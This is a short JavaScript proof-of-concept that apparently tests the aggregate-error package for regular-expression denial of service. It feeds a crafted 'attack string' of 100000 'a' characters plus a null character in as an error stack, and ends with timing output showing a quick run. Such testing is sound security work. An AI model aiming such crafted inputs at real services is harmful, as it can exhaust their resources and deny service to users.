import AggregateError from "./aggregate-error_v4.0.0-rCH8s5R9g4kQQ807o58j_dist_es2020_mode_imports_optimized_aggregate-error_12f7879e59421c0b09bf.js";

//AAttack String :""+"a"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\u0000";

const error = {
  stack: str,
};

var result = new AggregateError([error]);

// real    0m0.172s
// user    0m0.093s
// sys     0m0.028s
